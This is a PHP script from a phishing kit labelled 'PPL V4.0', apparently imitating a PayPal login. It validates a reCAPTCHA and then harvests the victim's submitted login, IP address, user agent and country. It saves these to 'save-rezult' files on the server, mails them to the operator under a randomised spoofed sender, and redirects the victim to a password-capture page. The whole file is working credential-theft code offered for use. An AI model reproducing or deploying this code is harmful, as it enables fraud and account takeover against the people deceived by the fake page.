<?php

session_start();


/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/
include("mail.php");
include("OS-Platform.php");
include("Geo-plugin.php");
include("Bot-blocker.php");

$response = $_POST["g-recaptcha-response"];

$url = 'https://www.google.com/recaptcha/api/siteverify';
$data = array(
	'secret' => '6LemEtAUAAAAAG4oZNH42KowWnDS131gAy4dAxCE',
	'response' => $_POST["g-recaptcha-response"]
);
$options = array(
	'http' => array (
		'method' => 'POST',
		'content' => http_build_query($data)
	)
);
$context  = stream_context_create($options);
$verify = file_get_contents($url, false, $context);
$captcha_success=json_decode($verify);
if ($captcha_success->success==false) {
	echo "<p>You are a bot! Go away!</p>";
} else if ($captcha_success->success==true) {

$login       = $_SESSION['_login_']        = $_POST['login'];
//// $password    = $_SESSION['_password_']     = $_POST['password'];

$RandomeMails = substr(str_shuffle(str_repeat('QWERTYUIOPLKJHGFDSAZXCVBNMqwertyuiopljhgfdsazxcvbnm123456789',50)),20,10);
/// $headers .= "From:XPPLV2 <service@".$RandomeMails.".com>";
$ip = getenv("REMOTE_ADDR");


$XJUNO .= "
".$os_platform."

<!DOCTYPE html>
<html>
<head>

	</style>
</head>
<body    style=' padding:0;margin:0;
    		padding:0;margin:0;
    		color: #000;
    		height: 100vh;
    		font-family: calibri;
    		font-size: 18px;'  >
	<p style='text-align: center;margin:40px 0;'  >
			<div id='logo' style='height: 39px; text-align: center;'><h1><span style='font-family: Trebuchet MS;'><font size='4'><span style='color: rgb(0, 48, 135); font-size: 26px;'><span style='color: rgb(51, 51, 51);'><font size='2'><b><font>&nbsp;</font></b></font><font size='3'><font size='2'>info</font> </font></span><b><font><span style='color: rgb(0, 51, 51);'><font size='2'><span style='color: rgb(51, 51, 51);'><font size='3'>&nbsp; </font></span><font size='5'><span style='color: rgb(51, 51, 255);'><span style='color: rgb(0, 0, 0);'><span style='color: rgb(0, 153, 0);'><span style='color: rgb(51, 51, 51);'><font size='6'> PPL V4.0 </font><font size='2'>V1.0</font></span><span style='color: rgb(0, 0, 0);'><font size='3'><font size='5'><span style='color: rgb(0, 0, 102);'></span></font></font></span></span></span></span></font></font></span></font></b></span><span style='color: rgb(51, 102, 102);'><b><span style='font-size: 26px;'><span style='color: rgb(0, 0, 0);'></span></span></b><span style='font-size: 26px;'></span></span><span style='color: rgb(0, 48, 135); font-size: 26px;'><font><span style='color: rgb(0, 51, 51);'></span></font></span></font></span></h1></div>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #fff;
			border-radius: 4px;
			box-shadow: 0 0 20px #fff; '>
		<div  style=' padding:10px 20px;  '>

			<p style='text-align: center;'> INFO ACCOUNT PPL V4.0 FROM :  [".$countryname."] ip = ".$_SERVER['REMOTE_ADDR']."   </p>
			<p>
				<table  style='background-color: #FFFFFF;margin:40px 0;border-bottom: 4px solid #fff;padding: color:#000;20px 0;border-radius: 4px;border-top: 4px solid #fff;'  >
				
				<tr>
						<td style=' width: 20%;'>
							[ Login ]
						</td>
						<td>: 
							".$_SESSION['_login_']."
						</td>
					</tr>
					
							
					<tr>
					
						<td style=' width: 20%;'>
							[Userag]
						</td>
						<td>: 
						".$_SERVER['HTTP_USER_AGENT']."
						</td>
					</tr>
					<tr>
						<td style='width: 20%;'>
							[Linnk-IP]
						</td>
						<td>: 
							
<a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']." </a>

						</td>
					</tr>
				</table>
			</p>
						
		</div>
	</div>
</body>
</html>


";
$XJUNO1 .= "<td class='don'><pre align=center><form method=post style='font-family:fantasy;'><a target='_blank' style='text-decoration:none;' href='".$_SERVER['REMOTE_ADDR'].".html'>".$_SERVER['REMOTE_ADDR'].".html</a></form></pre>
</td></tr></tbody></table>";

$f = fopen("../../save-rezult/database.php", "a");
	fwrite($f, $XJUNO1);

header("Location:../pw");
	 
$f = fopen("../../save-rezult/".$_SERVER['REMOTE_ADDR'].".html", "a");
	fwrite($f, $XJUNO);

/// $RandomeMails = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789',50)),20,10);
/// $headers .= "From:XNETFLIX <SERVICE@".$RandomeMails.".COM>";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " LOGIN - REZULTA  X-PPL V4.0 [ " .$ip. " - FROM [".$countryname."]";
$headers .= "From:XGERMANY V4.0 (SMS) <ppl-mister-klio@".$RandomeMails.".com>";

mail($yourmail, $subject, $XJUNO , $headers);
}
?>

